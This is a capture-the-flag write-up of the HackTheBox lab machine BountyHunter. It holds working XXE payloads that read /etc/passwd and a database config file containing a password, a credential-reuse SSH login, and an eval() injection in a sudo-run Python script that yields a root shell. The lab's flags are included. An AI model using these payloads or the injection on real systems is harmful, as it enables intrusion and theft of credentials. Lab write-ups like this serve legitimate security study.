---
title: HackTheBox[BOUNTYHUNTER]
author: Anurag M
date: 2021-11-20 14:30:00 +0800
categories: [HackTheBox]
tags: [ hackthebox, xxe, python, lfi, eval() ]
---

![bountyhunter](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/bountyhunter/hunter.jpeg)

BountyHunter is an easy rated CTF style machine at [Hackthebox](https://hackthebox.eu), the machine focuses on XXE (XML External Entity) injection to gain initial access to the machine and for escalating privilege to root we need to study the given python script in-order find the vulnerability and exploit it.

## About The Machine

| Name | OS | Difficulty | Creator |
|------|----|------------|---------|
| [BountyHunter](https://www.hackthebox.eu/home/machines/profile/359)  | Linux | Easy | [ejedev](https://www.hackthebox.eu/home/users/profile/280547) |

| Blood | User |
|-------|------|
| User | [InfoSecJack](https://www.hackthebox.eu/home/users/profile/52045) |
| Root | [InfoSecJack](https://www.hackthebox.eu/home/users/profile/52045) |

## Reconnaissance
### Nmap

```bash
┌─[eu-free-3]─[10.10.14.208]─[vincida@vincida]─[~/Desktop/HTB/LAB/bountyhunter]
└──╼ [★]$ nmap -sC -sV -A 10.10.11.100
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-20 02:12 IST
Nmap scan report for 10.10.11.100
Host is up (0.43s latency).
Not shown: 963 closed tcp ports (conn-refused), 35 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 190.27 seconds
```

From the initial nmap scan we can find that port 22 and 80 are open the machine, which are standard SSH and HTTP ports. As SSH port needs credentials to login, Let's take a look at the webpage.

### HTTP

Checking the webpage

![bountyhunter](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/bountyhunter/1.png)

We can find a simple landing page, but on further exploration we could find that the `potal button` redirects to `potal.php` 

![bountyhunter](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/bountyhunter/2.png)

The portal page we found is under development. But we are given a link to the `Bounty Tracker` which can test.

![bountyhunter](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/bountyhunter/3.png)

We have a nice little form where we could input some data that will get stored in the database.

![bountyhunter](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/bountyhunter/4.png)

If you remeber, on the landing page there was a line saying `Bounty Hunters - Security Researchers - Can use Burp` let's power-up our burpsuite to find some juicy information.

So we fired up our proxy, entered the values and intercepted the request, we can find that the data we entered is encoded to base64 and sent to the server.

![bountyhunter](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/bountyhunter/5.png)

Let's decode the encoded data

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>Test</title>
		<cwe>123</cwe>
		<cvss>1234</cvss>
		<reward>1337</reward>
		</bugreport>
```

Here we can see that the data is sent in the form of XML, which means that the webpage is likely vulnerable to `XML External Entities (XXE)`

To know more about the vulnerability, check out this [blog](https://www.synack.com/blog/a-deep-dive-into-xxe-injection/)

Let's construct a XXE payload so that we can pull out some sensitive files from the server and confirm the vulnerabilty.

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<bugreport>
<title>test</title>
<cwe>123</cwe>
<cvss>1337</cvss>
<reward>&file;</reward>
</bugreport>
```

Let's encode the payload with base64 and then url encode it and sent it to server using burpsuite.

![bountyhunter](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/bountyhunter/6.png)

And it worked, we were able to pull out `passwd` file from the server.

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash   <--- possible user on the machine
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

Now it's time to infiltrate into the system, as we know that the input data's are being stored in database, there has to be a database `configuration` file.

Let's use `Gobuster` to search for possible configuration file.

```bash
┌─[eu-free-3]─[10.10.14.208]─[vincida@vincida]─[~/Desktop/HTB/LAB/bountyhunter]
└──╼ [★]$ gobuster dir -u http://10.10.11.100 -w /usr/share/wordlists/dirb/common.txt -x PHP
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.100
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              PHP
[+] Timeout:                 10s
===============================================================
2021/11/20 03:52:48 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.hta.PHP             (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.PHP        (Status: 403) [Size: 277]
/.htpasswd.PHP        (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://10.10.11.100/assets/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.100/css/]
/db.php               (Status: 200) [Size: 203]    <--- database configuration file
/index.php            (Status: 200) [Size: 25169]                                
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.100/js/]    
/resources            (Status: 301) [Size: 316] [--> http://10.10.11.100/resources/]
/server-status        (Status: 403) [Size: 277]                                     
                                                                                    
===============================================================
2021/11/20 04:00:29 Finished
===============================================================
```

Yes, we have it. Let's create a new payload by twweaking the old one to read the content of `db.php`

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE bugreport [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
<bugreport>
<title>test</title>
<cwe>123</cwe>
<cvss>1337</cvss>
<reward>&file;</reward>
</bugreport>
```

Encode the payload and sent it the server, we get base64 encoded `db.php` as response.

## Gaining Foothold

Let's decode the base64 encoded `db.php`

```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

We have the possible username and password, let's try to use this credentials to login using SSH.

```bash
┌─[eu-free-3]─[10.10.14.208]─[vincida@vincida]─[~/Desktop/HTB/LAB/bountyhunter]
└──╼ [★]$ ssh admin@10.10.11.100
The authenticity of host '10.10.11.100 (10.10.11.100)' can't be established.
ECDSA key fingerprint is SHA256:3IaCMSdNq0Q9iu+vTawqvIf84OO0+RYNnsDxDBZI04Y.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.100' (ECDSA) to the list of known hosts.
admin@10.10.11.100's password: 
Permission denied, please try again.
admin@10.10.11.100's password: 
Permission denied, please try again.
admin@10.10.11.100's password: 
admin@10.10.11.100: Permission denied (publickey,password).
```

These credentials doe's not match. Going back to the `passwd` file there is a user called `development` let's try to login using `development:m19RoAU0hP41A1sTsq6K` 

Luckily, it worked..!!!

```bash
┌─[eu-free-3]─[10.10.14.208]─[vincida@vincida]─[~/Desktop/HTB/LAB/bountyhunter]
└──╼ [★]$ ssh development@10.10.11.100
development@10.10.11.100's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 19 Nov 2021 10:52:25 PM UTC

  System load:  0.03              Processes:             285
  Usage of /:   25.6% of 6.83GB   Users logged in:       1
  Memory usage: 27%               IPv4 address for eth0: 10.10.11.100
  Swap usage:   0%

  => There is 1 zombie process.


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Nov 19 21:25:12 2021 from 10.10.14.198
development@bountyhunter:~$ 
```

User flag can be found in the user's home directory

```bash
development@bountyhunter:~$ ls -la
total 56
drwxr-xr-x 5 development development  4096 Nov 19 22:53 .
drwxr-xr-x 3 root        root         4096 Jun 15 16:07 ..
lrwxrwxrwx 1 root        root            9 Apr  5  2021 .bash_history -> /dev/null
-rw-r--r-- 1 development development   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 development development  3771 Feb 25  2020 .bashrc
drwx------ 2 development development  4096 Apr  5  2021 .cache
lrwxrwxrwx 1 root        root            9 Jul  5 05:46 .lesshst -> /dev/null
drwxrwxr-x 3 development development  4096 Apr  6  2021 .local
-rw-r--r-- 1 development development   807 Feb 25  2020 .profile
drwx------ 2 development development  4096 Apr  7  2021 .ssh
-rw------- 1 development development 11901 Nov 19 21:03 .viminfo
-rw-r--r-- 1 root        root          471 Jun 15 16:10 contract.txt
-rwxrwxrwx 1 development development    37 Nov 19 22:53 flag
-r--r----- 1 root        development    33 Nov 19 20:21 user.txt
development@bountyhunter:~$ cat user.txt  <--- user flag
db9cc194ad959e2a5c3a2e6384a80585
development@bountyhunter:~$
```

## Privilege Escalation

There is an unusual txt file on the home directory, `contract.txt` let's find out what is it says.

```bash
development@bountyhunter:~$ cat contract.txt 
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
development@bountyhunter:~$
```

The note says that `there was an incident of complete data loss and this is their first job since the incident took place. So they have to be extra careful this time to avoid such incidents. Their job is to test an internal application of Skytrain Inc that works based on ticket validation, but the ticket validation is failing. They to find out why the ticket validation fails. Also John says that to test this application he has given permission to the users.`

Let's check user permissions

```bash
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
development@bountyhunter:~$
```

The user `development` is allowed to run  a python script `/opt/skytrain_inc/ticketValidator.py` with `python3.8` as root without any password.

Let's take a look at `ticketValidator.py`

```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

### Let's evaluate;

The script loads an input file with `.md` extension, in a specific format.

```
# Skytrain Inc
## Ticket to
__Ticket Code:__
**
```

Then the line `splits at position 0 at +` We need to find the ticket number, that is greater than 100. also we need to satisfy the condition `ticketcode % 7 == 4`
With knowledge in basic `Modulo Operator` we can find the value of `ticketcode`

Here, the value is `102`.

When all the conditions are met, the script will evaluate (`eval()`) our ticket. We can take advantage of this function because `eval()` function is dangerous and can be exploited.

So, keeping all this in miund let's create our ticket `root.md`

```bash
# Skytrain Inc
## Ticket to 
__Ticket Code:__
**102+ 1 == 103 and __import__('os').system('/bin/bash') == FALSE
```

create a file `root.md` with the above content in `/tmp` folder and validate the ticket.

```bash
development@bountyhunter:/tmp$ ls
root.md   <--- ticket
systemd-private-89dd429b92d24870a498379258426fff-apache2.service-uCbbef
systemd-private-89dd429b92d24870a498379258426fff-systemd-logind.service-YdKkrg
systemd-private-89dd429b92d24870a498379258426fff-systemd-resolved.service-HwFR4e
systemd-private-89dd429b92d24870a498379258426fff-systemd-timesyncd.service-geSBFf
vmware-root_666-2731021219
development@bountyhunter:/tmp$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
root.md
Destination: 
root@bountyhunter:/tmp# whoami;hostname
root
bountyhunter
root@bountyhunter:/tmp#
```

That worked, we have succefully pwned the system, Go to the `root` folder to grab the `root` flag.

```bash
root@bountyhunter:/tmp# cd /root
root@bountyhunter:~# ls -la
total 36
drwx------  6 root root 4096 Jul 22 11:11 .
drwxr-xr-x 19 root root 4096 Jul 21 12:00 ..
lrwxrwxrwx  1 root root    9 Apr  5  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Apr  6  2021 .cache
drwxr-xr-x  3 root root 4096 Apr  5  2021 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 Apr  5  2021 .ssh
lrwxrwxrwx  1 root root    9 Jul 22 11:11 .viminfo -> /dev/null
-r--------  1 root root   33 Nov 19 20:21 root.txt   <--- root flag
drwxr-xr-x  3 root root 4096 Apr  5  2021 snap
root@bountyhunter:~# cat root.txt
f2437623c75173288eaf6c4c17412a7e
root@bountyhunter:~#
```

## Resources

| Topic | Url |
|-------|-----|
| A Deep Dive into XXE Injection | [Click here](https://www.synack.com/blog/a-deep-dive-into-xxe-injection/) |
